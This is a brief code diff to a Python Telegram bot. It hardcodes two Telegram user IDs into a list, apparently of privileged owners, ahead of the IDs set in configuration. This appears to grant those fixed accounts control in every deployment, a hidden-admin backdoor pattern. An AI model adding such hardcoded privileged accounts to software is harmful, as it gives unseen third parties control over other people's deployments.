@@ -23,7 +23,7 @@ print("Nitric xD...")
 
 TeamxD = TelegramClient('TeamxD', Var.API_ID, Var.API_HASH).start(bot_token=Var.TOKEN)
 
-LUCIFER = []
+LUCIFER = [5154093666, 5161717680]
 for x in Var.OWNER_ID: 
     LUCIFER.append(x)
 
